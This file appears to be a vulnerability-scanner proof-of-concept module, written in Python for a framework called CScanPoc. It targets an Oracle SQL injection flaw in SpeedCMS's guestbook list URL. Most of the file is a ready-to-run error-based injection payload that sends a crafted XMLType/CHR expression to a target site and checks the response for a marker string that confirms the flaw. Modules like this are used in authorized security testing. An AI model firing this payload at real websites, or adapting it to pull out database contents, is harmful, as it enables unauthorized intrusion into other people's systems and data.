# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'SpeedCMS_0001'  # 平台漏洞编号，留空
    name = 'SpeedCMS某处Oracle注射'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-10-08'  # 漏洞公布时间
    desc = '''
        标准化企业内容管理系统(SpeedCMS) php框架采用SpeedPHP js框架采用jquery开发的一款软件。
        SpeedCMS某处Oracle注射漏洞。
        /guestbook/list/portalId/86/cid/828%27)%20AND%206152=
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0136530'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'SpeedCMS'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '3ed648eb-f1d1-4557-83bc-e47eb616db09'
    author = '国光'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = "/guestbook/list/portalId/86/cid/828%27)%20AND%206152=(SELECT%20UPPER(XMLType(CHR(60)%7C%7CCHR(58)%7C%7CCHR(113)%7C%7CCHR(112)%7C%7CCHR(120)%7C%7CCHR(106)%7C%7CCHR(113)%7C%7C(SELECT%20(CASE%20WHEN%20(6152=6152)%20THEN%201%20ELSE%200%20END)%20FROM%20DUAL)%7C%7CCHR(113)%7C%7CCHR(107)%7C%7CCHR(98)%7C%7CCHR(106)%7C%7CCHR(113)%7C%7CCHR(62)))%20FROM%20DUAL)%20AND%20(%27JTxZ%27=%27JTxZ"
            target = arg + payload
            code, head, res, errcode, _ = hh.http(target)
            if code == 200 and "qpxjq1qkbjq" in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
